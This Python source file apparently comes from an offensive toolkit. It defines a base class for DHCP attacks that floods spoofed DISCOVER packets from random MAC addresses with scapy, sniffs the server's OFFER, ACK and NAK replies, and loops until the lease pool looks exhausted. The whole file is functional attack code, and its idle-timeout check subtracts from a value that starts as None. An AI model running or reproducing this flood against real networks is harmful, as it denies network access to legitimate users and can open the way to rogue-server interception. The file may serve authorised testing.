import time
from attacks.base import BaseAttack
from common.packet_utils import random_mac, random_xid, mac_str_to_bytes
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, sniff


class BaseDHCPAttack(BaseAttack):
    """
    Shared skeleton for every attack that starts with a DISCOVER flood and
    reacts to sniffed OFFERs/ACKs/NAKs — e.g. StarvationAttack, DeclineFloodAttack.
    Subclasses implement the _on_offer/_on_ack/_on_nak hooks to decide what
    happens once an OFFER/ACK/NAK is observed; everything about getting an
    OFFER in the first place (sending DISCOVER, sniffing, the land-grab loop
    and its stop conditions) lives here once, instead of being duplicated.
    """

    def __init__(self, iface, rate=0.1, max_leases=None, exhaustion_timeout=5.0, logger=None):
        super().__init__(iface, logger)
        self.rate = rate
        self.max_leases = max_leases
        self.exhaustion_timeout = exhaustion_timeout
        self._last_offer_at = None
        # Which stats key counts as "one unit of progress toward max_leases".
        # Default assumes a full-DORA attack (Starvation): progress = ACKs.
        # A subclass whose flow never gets an ACK (e.g. DeclineFloodAttack,
        # where DECLINE is one-way and the server never replies) MUST
        # override this, or max_leases will never trigger.
        self._cap_stat_key = "ack_received"
        self.stats = {
            "discover_sent": 0,
            "offer_received": 0,
            "ack_received": 0,
            "nak_received": 0,
        }

    def _land_grab(self):
        while not self.stopped:
            if self.max_leases is not None and self.stats[self._cap_stat_key] >= self.max_leases:
                self.logger.info("Reached max_leases=%d, stopping.", self.max_leases)
                break
            if self.exhaustion_timeout is not None:
                idle_for = time.monotonic() - self._last_offer_at
                if idle_for >= self.exhaustion_timeout:
                    self.logger.warning(
                        "No OFFER received for %.1fs — pool likely exhausted, stopping.",
                        idle_for,
                    )
                    break
            self._send_discover()
            time.sleep(self.rate)

    def _send_discover(self):
        mac = random_mac()
        xid = random_xid()
        pkt = (
            Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=mac_str_to_bytes(mac), xid=xid, flags=0x8000) /
            DHCP(options=[("message-type", "discover"), "end"])
        )
        sendp(pkt, iface=self.iface, verbose=0)
        self.logger.debug("DISCOVER sent — MAC=%s xid=%s", mac, hex(xid))
        self.stats["discover_sent"] += 1

    def _sniff_offers(self):
        sniff(
            iface=self.iface,
            filter="udp and (port 67 or port 68)",
            prn=self._process_packet,
            store=0,
            stop_filter=lambda pkt: self.stopped,
        )

    def parse_dhcp_options(self, packet):
        # Returns a fixed-size (None, None, None) for a non-DHCP packet,
        # so the caller can always unpack the result safely instead of
        # crashing on "cannot unpack non-iterable NoneType".
        if not (packet.haslayer(DHCP) and packet.haslayer(BOOTP)):
            return None, None, None

        raw_options = packet[DHCP].options
        dhcp_options = {opt[0]: opt[1] for opt in raw_options if isinstance(opt, tuple)}

        msg_type = dhcp_options.get("message-type")
        xid = packet[BOOTP].xid
        return msg_type, xid, dhcp_options

    def _process_packet(self, packet):
        msg_type, xid, dhcp_options = self.parse_dhcp_options(packet)
        if msg_type is None:
            return

        if msg_type == 2:  # OFFER
            self.stats["offer_received"] += 1
            self._on_offer(packet[BOOTP].yiaddr, packet[IP].src, ":".join(f"{b:02x}" for b in packet[BOOTP].chaddr[:6]), xid)
        elif msg_type == 5:  # ACK
            self.stats["ack_received"] += 1
            self._on_ack(packet, dhcp_options, xid)
        elif msg_type == 6:  # NAK
            self.stats["nak_received"] += 1
            self._on_nak(packet)

    def _on_offer(self, offered_ip, server_ip, client_mac, xid):
        raise NotImplementedError

    def _on_ack(self, packet, dhcp_options, xid):
        raise NotImplementedError

    def _on_nak(self, packet):
        raise NotImplementedError
